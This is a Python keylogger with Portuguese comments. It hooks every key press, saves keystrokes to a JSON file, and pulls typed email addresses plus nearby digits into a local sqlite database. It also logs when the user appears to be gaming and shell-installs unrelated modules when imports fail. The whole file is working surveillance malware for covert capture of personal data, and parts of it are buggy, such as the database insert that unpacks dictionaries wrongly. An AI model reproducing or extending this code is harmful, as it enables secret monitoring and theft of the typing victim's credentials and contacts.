import re

try:
    import keyboard
    import time
    import threading
    import json
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot","sounddevice","pynput"]
    call("pip install " + ' '.join(modules), shell=True)
texto = ''
rodando = True
cont = 0
ultima_vez_w = 1
teclaspressionadas = []
intervalo = 0.3
emails = []
def create_data():
    """""Criando banco de dados para armazenar os emails em email []"""
    import sqlite3
    conn = sqlite3.connect("silentium_F7.db")
    cursor = conn.cursor()
    cursor.execute("DROP TABLE IF EXISTS emails")
    cursor.execute("""
    Create table IF NOT EXISTS emails (
      email TEXT PRIMARY KEY,
      dez TEXT NOT NULL
    )
    """)
    for email, dez in emails:
        cursor.execute("""
        INSERT OR IGNORE INTO emails (email, dez) VALUES (?,?)""",(email, dez))
    conn.commit()

    cursor.execute("SELECT * FROM emails")

    dados = cursor.fetchall()

    print(dados)
    conn.close()




def salvar_dados():
    """""Criando arquivo de dados para armazenar o contexto em contex.json"""
    with open("contexto.json", "w") as file:
        json.dump(teclaspressionadas, file, indent=2)



def ao_pressionar(evento):
        global texto


        tecla = evento.name
        teclaspressionadas.append({"tecla": tecla})
        if tecla == 'space':
            texto += ' '
        elif tecla == 'backspace':
            texto = texto[:-1]
        elif tecla == 'enter':
            texto = ''

        elif len(tecla) == 1:
            texto += tecla

        print("\r text:", texto, end='')

        if len(teclaspressionadas) % 10 == 0:
            salvar_dados()


        palavras = texto.split()
        for i, palavra in enumerate(palavras):
            if '@' in palavra:
                anteriores = palavras[max(0,  i - 8):i]
                contexto = ' '.join(anteriores)
                digitos = "".join(re.findall(r'\d+', contexto))
                dez = digitos [:10]
                emails.append({
                        "email": palavra,
                        "digitos": dez,
                    })
                create_data()









def detectar_w(e):
        global ultima_vez_w
        global cont
        global intervalo
        """para dectar se o usuario esta jogando"""

        agora = time.time()

        if agora - ultima_vez_w < intervalo:
            print("\n w 2x")
        ultima_vez_w = agora
        cont +=1
        if cont >= 20:
            jogo = 'usuario esta jogando'
            teclaspressionadas.append({"tecla": jogo})
            salvar_dados()


keyboard.on_press_key("w", detectar_w)


def ctrl():
        print("\r ctrl+c")


if __name__ == '__main__':
    create_data()


keyboard.add_hotkey("ctrl+c", ctrl)
keyboard.on_press(ao_pressionar)
keyboard.wait("esc")
#keylloger e para para-lo digite 'esc'
